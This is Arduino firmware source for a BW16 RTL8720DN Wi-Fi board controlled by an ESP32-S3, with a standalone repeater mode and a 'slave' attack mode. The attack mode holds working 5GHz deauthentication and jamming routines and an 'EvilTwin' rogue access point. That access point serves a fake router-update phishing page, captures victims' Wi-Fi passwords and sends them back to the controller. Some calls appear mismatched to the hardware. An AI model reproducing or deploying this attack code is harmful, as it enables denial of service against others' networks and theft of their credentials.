/*
 * bw16_dual_mode.ino — BW16 RTL8720DN Dual Mode Firmware
 * 
 * MODE 1 (SLAVE - Default): 
 *   - ESP32-S3 এর Slave হিসেবে UART JSON command execute
 *   - 5GHz scan, deauth, eviltwin, jammer
 *   - UART: Serial1 (GPIO7-RX, GPIO8-TX) @ 115200 baud
 * 
 * MODE 2 (REPEATER - Standalone):
 *   - ইউজার BW16 এর AP "BW16-Repeater" এ connect করে
 *   - Web UI: http://192.168.1.1
 *   - Router এ connect হয়ে Repeater AP তৈরি করে
 *   - নিজস্ব Web Server (Port 80), DHCP Server
 * 
 * AUTO-DETECT:
 *   - REPEATER মোডে থাকা অবস্থায় Serial1 এ ডাটা পেলেই
 *     স্বয়ংক্রিয়ভাবে SLAVE মোডে ফিরে যায়
 *   - ESP32-S3 থেকে {"cmd":"mode_repeater"} command পেলেও
 *     REPEATER মোডে সুইচ করে
 * 
 * Upload:
 *   Board: Ameba RTL8720DN / BW16
 *   Flash Size: 4MB (or your board's config)
 *   Port: Select the correct COM port
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <cJSON.h>

/* =================== PIN CONFIG =================== */
#define UART_RX_PIN  7   // PB1 → ESP32-S3 TX2 (GPIO17)
#define UART_TX_PIN  8   // PB2 → ESP32-S3 RX2 (GPIO18)
#define UART_BAUD    115200
#define LED_BUILTIN  10  // BW16 onboard LED

/* =================== MODE ENUM =================== */
enum BW16Mode {
    MODE_SLAVE,
    MODE_REPEATER
};

static BW16Mode current_mode = MODE_SLAVE;
static bool mode_switching = false;
static unsigned long mode_switch_start = 0;

/* =================== REPEATER CONFIG =================== */
#define REPEATER_AP_SSID    "BW16-Repeater"
#define REPEATER_AP_PASS    NULL  // Open AP
#define REPEATER_AP_CH      6
#define REPEATER_MAX_CLIENTS 8

static IPAddress repeater_ip(192, 168, 1, 1);
static IPAddress repeater_gw(192, 168, 1, 1);
static IPAddress repeater_subnet(255, 255, 255, 0);

static WebServer repeater_web(80);
static bool repeater_connected = false;
static String repeater_target_ssid = "";
static String repeater_target_pass = "";
static unsigned long repeater_last_scan = 0;
static bool repeater_scan_busy = false;

/* =================== ATTACK STATE (SLAVE MODE) =================== */
static bool attack_running = false;
static String attack_op = "";
static int attack_channel = 0;
static uint8_t attack_bssid[6] = {0};
static String attack_ssid = "";

// EvilTwin AP (in SLAVE mode)
static bool eviltwin_active = false;
static WiFiServer eviltwin_server(80);

/* =================== UART BUFFER =================== */
static String uart_buffer = "";
static const unsigned long UART_TIMEOUT_MS = 50;

/* =================== FORWARD DECLARATIONS =================== */
// Core
void slave_loop(void);
void repeater_loop(void);
void enter_slave_mode(void);
void enter_repeater_mode(void);
void switch_to_repeater(void);
void switch_to_slave(void);

// UART
void process_uart(void);
void handle_uart_command(const String &json);
void send_uart(const String &json);

// Slave Commands
void cmd_scan_5ghz(void);
void cmd_deauth_5ghz(const String &bssid_str, int channel);
void cmd_jammer_start(int channel);
void cmd_jammer_stop(void);
void cmd_eviltwin_start(const String &ssid, const String &bssid, int channel);
void cmd_eviltwin_stop(void);
void cmd_status(void);

// EvilTwin helper
void eviltwin_handle_client(void);

// Repeater Web Handlers
void repeater_handle_root(void);
void repeater_handle_scan(void);
void repeater_handle_status(void);
void repeater_handle_connect(void);
void repeater_handle_disconnect(void);

/* =================== SETUP =================== */
void setup() {
    Serial.begin(115200);           // USB debug
    Serial1.begin(UART_BAUD, SERIAL_8N1, UART_RX_PIN, UART_TX_PIN);  // ESP32-S3 comm
    
    pinMode(LED_BUILTIN, OUTPUT);
    digitalWrite(LED_BUILTIN, LOW);
    
    WiFi.mode(WIFI_OFF);
    
    Serial.println(F("========================================"));
    Serial.println(F(" BW16 RTL8720DN - Dual Mode Firmware"));
    Serial.println(F(" Mode: SLAVE (awaiting ESP32-S3)"));
    Serial.println(F("========================================"));
    
    current_mode = MODE_SLAVE;
    send_uart("{\"event\":\"ready\",\"mode\":\"slave\",\"msg\":\"BW16 online\"}");
}

/* =================== MAIN LOOP =================== */
void loop() {
    // Handle mode switching
    if (mode_switching) {
        if (millis() - mode_switch_start > 2000) {
            mode_switching = false;
        }
        delay(10);
        return;
    }
    
    switch (current_mode) {
        case MODE_SLAVE:
            slave_loop();
            break;
        case MODE_REPEATER:
            repeater_loop();
            break;
    }
    
    delay(5);
}

/* =================== SLAVE MODE LOOP =================== */
void slave_loop() {
    // Read UART data
    process_uart();
    
    // Handle EvilTwin clients
    if (eviltwin_active) {
        eviltwin_handle_client();
    }
}

/* =================== UART PROCESSING =================== */
void process_uart() {
    while (Serial1.available()) {
        char c = Serial1.read();
        if (c == '\n') {
            if (uart_buffer.length() > 0) {
                uart_buffer.trim();
                if (uart_buffer.length() > 0) {
                    handle_uart_command(uart_buffer);
                }
                uart_buffer = "";
            }
        } else {
            uart_buffer += c;
            // Prevent buffer overflow
            if (uart_buffer.length() > 2048) {
                uart_buffer = "";
            }
        }
    }
}

void handle_uart_command(const String &json) {
    Serial.print(F("[BW16] RX: "));
    Serial.println(json);
    
    cJSON *root = cJSON_Parse(json.c_str());
    if (!root) {
        send_uart("{\"event\":\"error\",\"msg\":\"Invalid JSON\"}");
        return;
    }
    
    cJSON *cmd = cJSON_GetObjectItem(root, "cmd");
    if (!cmd || !cJSON_IsString(cmd)) {
        cJSON_Delete(root);
        send_uart("{\"event\":\"error\",\"msg\":\"No cmd field\"}");
        return;
    }
    
    String command = cmd->valuestring;
    
    if (command == "scan_5ghz") {
        cmd_scan_5ghz();
    }
    else if (command == "deauth") {
        cJSON *target = cJSON_GetObjectItem(root, "bssid");
        cJSON *ch = cJSON_GetObjectItem(root, "channel");
        cmd_deauth_5ghz(
            target ? target->valuestring : "",
            ch ? ch->valueint : 1
        );
    }
    else if (command == "jammer_start") {
        cJSON *ch = cJSON_GetObjectItem(root, "channel");
        cmd_jammer_start(ch ? ch->valueint : 0);
    }
    else if (command == "jammer_stop") {
        cmd_jammer_stop();
    }
    else if (command == "eviltwin_start") {
        cJSON *ssid = cJSON_GetObjectItem(root, "ssid");
        cJSON *bssid = cJSON_GetObjectItem(root, "bssid");
        cJSON *ch = cJSON_GetObjectItem(root, "channel");
        if (!ssid || !cJSON_IsString(ssid)) {
            send_uart("{\"event\":\"error\",\"msg\":\"SSID required\"}");
            cJSON_Delete(root);
            return;
        }
        cmd_eviltwin_start(
            ssid->valuestring,
            bssid ? bssid->valuestring : "",
            ch ? ch->valueint : 1
        );
    }
    else if (command == "eviltwin_stop") {
        cmd_eviltwin_stop();
    }
    else if (command == "mode_repeater") {
        Serial.println(F("[BW16] Switching to REPEATER mode by command"));
        cJSON_Delete(root);
        send_uart("{\"event\":\"mode_change\",\"mode\":\"repeater\"}");
        delay(100);
        switch_to_repeater();
        return;
    }
    else if (command == "mode_slave") {
        send_uart("{\"event\":\"status\",\"mode\":\"slave\"}");
    }
    else if (command == "status") {
        cmd_status();
    }
    else {
        send_uart("{\"event\":\"error\",\"msg\":\"Unknown: " + command + "\"}");
    }
    
    cJSON_Delete(root);
}

void send_uart(const String &json) {
    Serial.print(F("[BW16] TX: "));
    Serial.println(json);
    Serial1.println(json);
    Serial1.flush();
}

/* =================== 5GHz SCAN =================== */
void cmd_scan_5ghz() {
    if (attack_running && attack_op != "scan") {
        send_uart("{\"event\":\"error\",\"msg\":\"Busy with " + attack_op + "\"}");
        return;
    }
    
    attack_running = true;
    attack_op = "scan";
    
    Serial.println(F("[BW16] Scanning 5GHz channels..."));
    
    int channels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
    int num_ch = sizeof(channels) / sizeof(channels[0]);
    
    String result = "{\"event\":\"scan_result\",\"networks\":[";
    bool first = true;
    
    for (int i = 0; i < num_ch; i++) {
        WiFi.setChannel(channels[i], WIFI_SECOND_CHAN_NONE);
        delay(80);
        
        int n = WiFi.scanNetworks(false, true, false, 150, channels[i]);
        
        for (int j = 0; j < n; j++) {
            String ssid = WiFi.SSID(j);
            if (ssid.length() == 0) continue;
            
            if (!first) result += ",";
            first = false;
            
            ssid.replace("\"", "\\\"");
            result += "{\"ssid\":\"" + ssid + "\",";
            result += "\"bssid\":\"" + WiFi.BSSIDstr(j) + "\",";
            result += "\"channel\":" + String(channels[i]) + ",";
            result += "\"rssi\":" + String(WiFi.RSSI(j)) + ",";
            result += "\"is_5ghz\":true}";
        }
        WiFi.scanDelete();
    }
    
    result += "]}";
    
    send_uart(result);
    Serial.println(F("[BW16] 5GHz scan complete"));
    digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
    
    attack_running = false;
    attack_op = "";
}

/* =================== 5GHz DEAUTH =================== */
void cmd_deauth_5ghz(const String &bssid_str, int channel) {
    if (attack_running) {
        send_uart("{\"event\":\"error\",\"msg\":\"Busy\"}");
        return;
    }
    
    attack_running = true;
    attack_op = "deauth";
    attack_channel = channel;
    
    Serial.printf("[BW16] Deauth: %s ch %d\n", bssid_str.c_str(), channel);
    
    // Parse BSSID
    uint8_t target[6];
    sscanf(bssid_str.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
           &target[0], &target[1], &target[2], &target[3], &target[4], &target[5]);
    
    WiFi.setChannel(channel, WIFI_SECOND_CHAN_NONE);
    
    uint8_t pkt[26];
    memcpy(&pkt[0], target, 6);     // DA
    memcpy(&pkt[6], target, 6);     // SA (spoofed)
    memcpy(&pkt[12], target, 6);    // BSSID
    pkt[18] = 0xC0;                 // Deauth frame
    pkt[19] = 0x00;
    pkt[20] = 0x07;                 // Reason: Class 3 frame from nonassociated STA
    pkt[21] = 0x00;
    
    int pkts = 0;
    for (int i = 0; i < 150 && attack_running; i++) {
        WiFi.sendPacket(pkt, 26, channel);
        pkts++;
        
        // Every 5th packet: broadcast
        if (i % 5 == 0) {
            uint8_t saved[6];
            memcpy(saved, pkt, 6);
            memset(pkt, 0xFF, 6);
            WiFi.sendPacket(pkt, 26, channel);
            memcpy(pkt, saved, 6);
            pkts++;
        }
        
        delay(8);
    }
    
    attack_running = false;
    attack_op = "";
    
    Serial.printf("[BW16] Deauth done: %d packets\n", pkts);
    send_uart("{\"event\":\"success\",\"msg\":\"Deauth sent " + String(pkts) + " packets\"}");
}

/* =================== 5GHz JAMMER =================== */
void cmd_jammer_start(int channel) {
    if (attack_running) {
        send_uart("{\"event\":\"error\",\"msg\":\"Busy\"}");
        return;
    }
    
    attack_running = true;
    attack_op = "jammer";
    
    Serial.println(F("[BW16] 5GHz Jammer started"));
    send_uart("{\"event\":\"jammer_started\",\"msg\":\"5GHz jammer active\"}");
    
    int channels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
    int num_ch = sizeof(channels) / sizeof(channels[0]);
    int64_t pkts = 0;
    unsigned long start = millis();
    
    uint8_t noise[24];
    for (int i = 0; i < 24; i++) noise[i] = random(0, 255);
    noise[18] = 0x40; // Probe request
    
    while (attack_running && (millis() - start) < 30000) {
        for (int i = 0; i < 5 && attack_running; i++) {
            int ch = channels[random(0, num_ch)];
            WiFi.setChannel(ch, WIFI_SECOND_CHAN_NONE);
            WiFi.sendPacket(noise, sizeof(noise), ch);
            pkts++;
            noise[random(0, 6)] = random(0, 255);
        }
        delay(1);
        
        if (pkts % 1000 == 0) {
            send_uart("{\"event\":\"jammer_status\",\"pkts\":" + String(pkts) + "}");
        }
    }
    
    attack_running = false;
    attack_op = "";
    
    Serial.printf("[BW16] Jammer stopped: %lld packets\n", (long long)pkts);
    send_uart("{\"event\":\"jammer_stopped\",\"pkts\":" + String(pkts) + "}");
}

void cmd_jammer_stop() {
    attack_running = false;
    Serial.println(F("[BW16] Jammer stop requested"));
}

/* =================== EVILTWIN (SLAVE MODE) =================== */
void cmd_eviltwin_start(const String &ssid, const String &bssid, int channel) {
    if (eviltwin_active) {
        send_uart("{\"event\":\"error\",\"msg\":\"EvilTwin already running\"}");
        return;
    }
    
    attack_ssid = ssid;
    attack_channel = channel;
    
    Serial.printf("[BW16] EvilTwin: '%s' ch %d\n", ssid.c_str(), channel);
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid.c_str(), NULL, channel, 0, 1);
    
    eviltwin_server.begin(80);
    eviltwin_active = true;
    
    String ip = WiFi.softAPIP().toString();
    send_uart("{\"event\":\"eviltwin_started\",\"ssid\":\"" + ssid + "\",\"ip\":\"" + ip + "\"}");
}

void cmd_eviltwin_stop() {
    if (eviltwin_active) {
        eviltwin_server.stop();
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        eviltwin_active = false;
    }
    send_uart("{\"event\":\"eviltwin_stopped\"}");
}

void eviltwin_handle_client() {
    WiFiClient client = eviltwin_server.available();
    if (!client) return;
    
    String request = "";
    unsigned long t = millis();
    while (client.connected() && (millis() - t) < 2000) {
        if (client.available()) {
            char c = client.read();
            request += c;
            if (request.endsWith("\r\n\r\n")) break;
        }
    }
    
    // Fishing page
    String html = F("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>");
    html += F("<title>WiFi Update</title><style>");
    html += F("*{margin:0;padding:0;box-sizing:border-box}");
    html += F("body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}");
    html += F(".card{background:white;border-radius:12px;padding:30px;max-width:400px;width:90%;box-shadow:0 4px 20px rgba(0,0,0,0.1)}");
    html += F("h2{color:#333;text-align:center;margin-bottom:8px}");
    html += F("p{color:#666;text-align:center;margin-bottom:20px;font-size:14px}");
    html += F("input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;margin-bottom:16px;outline:none}");
    html += F("input:focus{border-color:#007aff}");
    html += F("button{width:100%;padding:14px;background:#007aff;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer}");
    html += F("</style></head><body><div class='card'>");
    html += F("<h2>📶 WiFi Security Update</h2>");
    html += F("<p>Your router requires a firmware update.<br>Enter your WiFi password to continue.</p>");
    html += F("<form method='POST' action='/login'>");
    html += F("<input type='password' name='password' placeholder='WiFi Password' required>");
    html += F("<button type='submit'>Update Now</button>");
    html += F("</form></div></body></html>");
    
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html");
    client.println("Connection: close");
    client.println();
    client.println(html);
    
    // Handle POST
    if (request.indexOf("POST") >= 0) {
        String body = request.substring(request.indexOf("\r\n\r\n") + 4);
        int idx = body.indexOf("password=");
        if (idx >= 0) {
            String pass = body.substring(idx + 9);
            int amp = pass.indexOf("&");
            if (amp >= 0) pass = pass.substring(0, amp);
            pass.replace("+", " ");
            pass.replace("%40", "@");
            pass.replace("%23", "#");
            
            send_uart("{\"event\":\"captured\",\"ssid\":\"" + attack_ssid + "\",\"password\":\"" + pass + "\"}");
            
            client.println("HTTP/1.1 200 OK");
            client.println("Content-Type: text/html");
            client.println();
            client.println(F("<!DOCTYPE html><html><body style='font-family:Arial;text-align:center;padding:50px'>"));
            client.println(F("<h2 style='color:#4CAF50'>✅ Update Complete</h2><p>You may close this page.</p></body></html>"));
        }
    }
    
    delay(50);
    client.stop();
}

void cmd_status() {
    String json = "{\"event\":\"status\",\"mode\":\"slave\",\"info\":{";
    json += "\"attack_running\":" + String(attack_running ? "true" : "false") + ",";
    json += "\"attack_op\":\"" + attack_op + "\",";
    json += "\"eviltwin\":" + String(eviltwin_active ? "true" : "false") + ",";
    json += "\"heap\":" + String(ESP.getFreeHeap());
    json += "}}";
    send_uart(json);
}

/* =================== MODE SWITCHING =================== */
void switch_to_repeater() {
    // Stop all slave operations
    attack_running = false;
    if (eviltwin_active) {
        eviltwin_server.stop();
        WiFi.softAPdisconnect(true);
        eviltwin_active = false;
    }
    
    mode_switching = true;
    mode_switch_start = millis();
    
    Serial.println(F("[BW16] Switching to REPEATER mode..."));
    enter_repeater_mode();
}

void switch_to_slave() {
    // Stop repeater
    if (repeater_connected) {
        WiFi.softAPdisconnect(true);
        WiFi.disconnect();
        repeater_connected = false;
    }
    repeater_web.stop();
    
    mode_switching = true;
    mode_switch_start = millis();
    
    Serial.println(F("[BW16] Switching to SLAVE mode..."));
    enter_slave_mode();
}

void enter_repeater_mode() {
    Serial.println(F("[BW16] ===== REPEATER MODE ====="));
    
    // Start AP
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(repeater_ip, repeater_gw, repeater_subnet);
    WiFi.softAP(REPEATER_AP_SSID, REPEATER_AP_PASS, REPEATER_AP_CH, 0, 1);
    
    // Setup web server
    repeater_web.on("/", repeater_handle_root);
    repeater_web.on("/api/scan", repeater_handle_scan);
    repeater_web.on("/api/status", repeater_handle_status);
    repeater_web.on("/api/connect", HTTP_POST, repeater_handle_connect);
    repeater_web.on("/api/disconnect", repeater_handle_disconnect);
    repeater_web.begin();
    
    Serial.printf("[BW16] Web UI: http://%d.%d.%d.%d\n",
                  repeater_ip[0], repeater_ip[1], repeater_ip[2], repeater_ip[3]);
    
    // Initial scan
    WiFi.scanNetworks(true);
    repeater_last_scan = millis();
    
    current_mode = MODE_REPEATER;
    mode_switching = false;
}

void enter_slave_mode() {
    Serial.println(F("[BW16] ===== SLAVE MODE ====="));
    
    // Cleanup repeater
    if (repeater_connected) {
        WiFi.softAPdisconnect(true);
        WiFi.disconnect();
        repeater_connected = false;
        repeater_target_ssid = "";
        repeater_target_pass = "";
    }
    repeater_web.stop();
    
    WiFi.mode(WIFI_OFF);
    
    // Re-init UART
    Serial1.begin(UART_BAUD, SERIAL_8N1, UART_RX_PIN, UART_TX_PIN);
    uart_buffer = "";
    
    current_mode = MODE_SLAVE;
    mode_switching = false;
    
    send_uart("{\"event\":\"ready\",\"mode\":\"slave\",\"msg\":\"Back in slave mode\"}");
}

/* =================== REPEATER MODE LOOP =================== */
void repeater_loop() {
    // Handle web clients
    repeater_web.handleClient();
    
    // ===== AUTO-DETECT ESP32-S3 =====
    // REPEATER মোডে থাকা অবস্থায় যদি UART (Serial1) এ
    // কোনো ডাটা আসে, তাহলে বুঝব ESP32-S3 আবার চালু হয়েছে।
    // স্বয়ংক্রিয়ভাবে SLAVE মোডে ফিরে যাব।
    if (Serial1.available()) {
        String data = "";
        unsigned long timeout = millis();
        while (Serial1.available() || (millis() - timeout) < 100) {
            if (Serial1.available()) {
                char c = Serial1.read();
                data += c;
                timeout = millis();
            }
        }
        data.trim();
        
        if (data.length() > 0) {
            Serial.printf("[BW16] UART detect (%d bytes): %s\n", data.length(), data.substring(0, 50).c_str());
            Serial.println(F("[BW16] ESP32-S3 detected! Switching to SLAVE mode..."));
            
            switch_to_slave();
            
            // Process the received command
            delay(200);
            handle_uart_command(data);
            return;
        }
    }
    
    // Auto-reconnect
    if (repeater_connected && WiFi.status() != WL_CONNECTED) {
        static unsigned long last_recon = 0;
        if (millis() - last_recon > 10000) {
            Serial.printf("[BW16] Reconnecting to '%s'...\n", repeater_target_ssid.c_str());
            WiFi.begin(repeater_target_ssid.c_str(), repeater_target_pass.c_str());
            last_recon = millis();
        }
    }
    
    // Auto-scan every 30s
    if (millis() - repeater_last_scan > 30000 && !repeater_scan_busy) {
        WiFi.scanNetworks(true);
        repeater_last_scan = millis();
    }
}

/* =================== REPEATER WEB HANDLERS =================== */
void repeater_handle_root() {
    String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>BW16 Repeater</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
.container{max-width:500px;margin:0 auto;padding:16px}
.header{background:linear-gradient(135deg,#00d4ff,#007bff);padding:20px;border-radius:12px;margin-bottom:20px;text-align:center}
.header h1{font-size:22px;color:#fff;margin-bottom:4px}
.header p{font-size:13px;color:rgba(255,255,255,0.8)}
.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600;margin-top:8px;background:#1a237e;color:#90caf9}
.card{background:#141420;border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid #2a2a3a}
.card h2{font-size:16px;color:#00d4ff;margin-bottom:12px;border-bottom:1px solid #2a2a3a;padding-bottom:8px}
.status-bar{display:flex;align-items:center;gap:10px;padding:12px;background:#1a1a2e;border-radius:8px;margin-bottom:12px}
.status-bar .dot{width:12px;height:12px;border-radius:50%}
.dot.green{background:#4caf50;box-shadow:0 0 8px rgba(76,175,80,0.5)}
.dot.red{background:#f44336;box-shadow:0 0 8px rgba(244,67,54,0.5)}
.dot.blue{background:#2196f3;box-shadow:0 0 8px rgba(33,150,243,0.5)}
.info-row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px;border-bottom:1px solid #1a1a2e}
.info-row:last-child{border-bottom:none}
.info-row .label{color:#888}
.info-row .value{color:#e0e0e0;font-family:monospace}
input,select{width:100%;padding:12px;background:#1a1a2e;border:1px solid #2a2a3a;border-radius:8px;color:#e0e0e0;font-size:14px;margin-bottom:10px;outline:none}
input:focus,select:focus{border-color:#00d4ff}
button{width:100%;padding:12px;background:linear-gradient(135deg,#00d4ff,#007bff);border:none;border-radius:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:transform 0.2s}
button:hover{transform:translateY(-1px)}
.btn-red{background:linear-gradient(135deg,#ff4444,#cc0000)}
.btn-green{background:linear-gradient(135deg,#4caf50,#2e7d32)}
.network-list{max-height:250px;overflow-y:auto;display:none}
.network-item{display:flex;justify-content:space-between;align-items:center;padding:10px;background:#1a1a2e;border-radius:6px;margin-bottom:6px;cursor:pointer}
.network-item:hover{background:#2a2a3a}
.network-item .ssid{font-size:14px;font-weight:500}
.network-item .info{font-size:11px;color:#888}
.scanning{text-align:center;padding:20px;color:#888}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>📡 BW16 Repeater</h1>
<p>192.168.1.1 • Dual-Band 2.4/5GHz</p>
<span class="badge">Standalone Mode</span>
</div>
<div class="card">
<h2>⚡ Status</h2>
<div class="status-bar"><span class="dot" id="sDot"></span><span id="sTxt">Loading...</span></div>
<div id="sDet"></div>
</div>
<div class="card">
<h2>📶 Connect</h2>
<input type="text" id="ssid" placeholder="Select or type SSID" readonly onclick="document.getElementById('nList').style.display='block';scanNow()">
<div id="nList" class="network-list"></div>
<input type="password" id="pass" placeholder="WiFi Password">
<select id="band"><option value="auto">Auto</option><option value="2.4">2.4GHz</option><option value="5">5GHz</option></select>
<button onclick="connect()">🔗 Connect</button>
<button class="btn-red" onclick="disconnect()" style="margin-top:8px">⛔ Disconnect</button>
</div>
<div class="card"><h2>👥 Clients</h2><div id="clients">None</div></div>
</div>
<script>
function $(id){return document.getElementById(id)}
function toast(m,t){let d=$('toast');if(!d){d=document.createElement('div');d.id='toast';d.style.cssText='position:fixed;bottom:20px;left:50%;transform:translateX(-50%);padding:12px 24px;border-radius:8px;z-index:1000;display:none';document.body.appendChild(d)}
d.textContent=m;d.className='toast '+t;d.style.display='block';setTimeout(()=>d.style.display='none',3000)}
function status(){fetch('/api/status').then(r=>r.json()).then(d=>{
$('sDot').className='dot '+(d.connected?'green':'red');
$('sTxt').textContent=d.connected?'✅ '+d.ssid:'❌ Disconnected';
let h='<div class="info-row"><span class="label">AP</span><span class="value">192.168.1.1</span></div>';
h+='<div class="info-row"><span class="label">AP SSID</span><span class="value">BW16-Repeater</span></div>';
if(d.sta_ip)h+='<div class="info-row"><span class="label">WAN IP</span><span class="value">'+d.sta_ip+'</span></div>';
h+='<div class="info-row"><span class="label">Clients</span><span class="value">'+(d.clients||0)+'</span></div>';
$('sDet').innerHTML=h;
let c='';if(d.client_list&&d.client_list.length>0){d.client_list.forEach(m=>{c+='<div style="padding:6px;background:#1a1a2e;border-radius:4px;margin:4px 0;font-size:12px;font-family:monospace">'+m+'</div>'})}else{c='<div style="color:#666">No clients</div>'}
$('clients').innerHTML=c}).catch(()=>{})}
function scanNow(){let l=$('nList');l.innerHTML='<div class="scanning">🔍 Scanning...</div>';
fetch('/api/scan').then(r=>r.json()).then(d=>{let h='';
if(d.networks&&d.networks.length>0){d.networks.forEach(n=>{
h+='<div class="network-item" onclick="$(\'ssid\').value=\''+n.ssid.replace(/'/g,"\\'")+'\';$(\'nList\').style.display=\'none\'">';
h+='<div><div class="ssid">'+n.ssid+'</div><div class="info">'+(n.is_5ghz?'5G':'2.4')+' Ch'+n.channel+'</div></div>';
h+='<div style="font-size:12px;color:#aaa">'+n.rssi+'dBm</div></div>'})}else{h='<div style="padding:10px;color:#888;text-align:center">No networks</div>'}
l.innerHTML=h}).catch(()=>{l.innerHTML='<div style="padding:10px;color:#f44">Failed</div>'})}
function connect(){let s=$('ssid').value,p=$('pass').value,b=$('band').value;
if(!s||!p){toast('Fill all fields','error');return}
fetch('/api/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ssid:s,password:p,band:b})})
.then(r=>r.json()).then(d=>toast(d.status==='ok'?'✅ Connected!':'❌ '+d.message,d.status==='ok'?'success':'error'))
.catch(()=>toast('❌ Error','error'))}
function disconnect(){fetch('/api/disconnect').then(()=>toast('Disconnected','info')).catch(()=>{})}
setInterval(status,3000);status();scanNow();
</script></body></html>
    )rawliteral";
    
    repeater_web.send(200, "text/html", html);
}

void repeater_handle_scan() {
    repeater_scan_busy = true;
    
    int n = WiFi.scanComplete();
    if (n == WIFI_SCAN_FAILED) {
        WiFi.scanNetworks(true);
        repeater_web.send(200, "application/json", "{\"networks\":[]}");
        repeater_scan_busy = false;
        return;
    }
    
    String json = "{\"networks\":[";
    bool first = true;
    
    for (int i = 0; i < n; i++) {
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) continue;
        
        if (!first) json += ",";
        first = false;
        
        ssid.replace("\"", "\\\"");
        json += "{\"ssid\":\"" + ssid + "\",";
        json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
        json += "\"channel\":" + String(WiFi.channel(i)) + ",";
        json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
        json += "\"is_5ghz\":" + String(WiFi.channel(i) >= 36 ? "true" : "false") + "}";
    }
    json += "]}";
    
    WiFi.scanDelete();
    repeater_web.send(200, "application/json", json);
    repeater_scan_busy = false;
}

void repeater_handle_status() {
    String json = "{";
    json += "\"connected\":" + String(repeater_connected ? "true" : "false") + ",";
    json += "\"ssid\":\"" + repeater_target_ssid + "\",";
    
    if (repeater_connected) {
        json += "\"sta_ip\":\"" + WiFi.localIP().toString() + "\",";
        json += "\"rssi\":" + String(WiFi.RSSI()) + ",";
    }
    
    int clients = WiFi.softAPgetStationNum();
    json += "\"clients\":" + String(clients) + ",";
    
    json += "\"client_list\":[";
    wifi_sta_list_t sta_list;
    esp_wifi_ap_get_sta_list(&sta_list);
    for (int i = 0; i < sta_list.num; i++) {
        if (i > 0) json += ",";
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 sta_list.sta[i].mac[0], sta_list.sta[i].mac[1],
                 sta_list.sta[i].mac[2], sta_list.sta[i].mac[3],
                 sta_list.sta[i].mac[4], sta_list.sta[i].mac[5]);
        json += "\"" + String(mac) + "\"";
    }
    json += "],";
    
    json += "\"uptime\":\"" + String(millis() / 1000) + "s\"";
    json += "}";
    
    repeater_web.send(200, "application/json", json);
}

void repeater_handle_connect() {
    if (!repeater_web.hasArg("plain")) {
        repeater_web.send(400, "application/json", "{\"status\":\"error\",\"msg\":\"No data\"}");
        return;
    }
    
    String body = repeater_web.arg("plain");
    String ssid = "", pass = "";
    
    int s = body.indexOf("\"ssid\"");
    if (s >= 0) {
        s = body.indexOf(":", s + 6);
        s = body.indexOf("\"", s + 1);
        int e = body.indexOf("\"", s + 1);
        if (s >= 0 && e > s) ssid = body.substring(s + 1, e);
    }
    
    s = body.indexOf("\"password\"");
    if (s >= 0) {
        s = body.indexOf(":", s + 10);
        s = body.indexOf("\"", s + 1);
        int e = body.indexOf("\"", s + 1);
        if (s >= 0 && e > s) pass = body.substring(s + 1, e);
    }
    
    if (ssid.length() == 0 || pass.length() == 0) {
        repeater_web.send(400, "application/json", "{\"status\":\"error\",\"msg\":\"Missing fields\"}");
        return;
    }
    
    repeater_target_ssid = ssid;
    repeater_target_pass = pass;
    
    if (repeater_connected) {
        WiFi.disconnect();
        delay(500);
    }
    
    WiFi.begin(ssid.c_str(), pass.c_str());
    
    bool ok = false;
    for (int i = 0; i < 30; i++) {
        delay(1000);
        if (WiFi.status() == WL_CONNECTED) {
            ok = true;
            break;
        }
    }
    
    if (ok) {
        repeater_connected = true;
        String ap_ssid = "Repeater-" + ssid.substring(0, 12);
        WiFi.softAPConfig(repeater_ip, repeater_gw, repeater_subnet);
        WiFi.softAP(ap_ssid.c_str(), NULL, REPEATER_AP_CH, 0, 1);
        
        repeater_web.send(200, "application/json", "{\"status\":\"ok\",\"msg\":\"Connected to " + ssid + "\"}");
    } else {
        repeater_connected = false;
        repeater_web.send(200, "application/json", "{\"status\":\"error\",\"msg\":\"Connection timeout\"}");
    }
}

void repeater_handle_disconnect() {
    WiFi.softAPdisconnect(true);
    WiFi.disconnect();
    repeater_connected = false;
    repeater_target_ssid = "";
    repeater_target_pass = "";
    repeater_web.send(200, "application/json", "{\"status\":\"ok\"}");
}
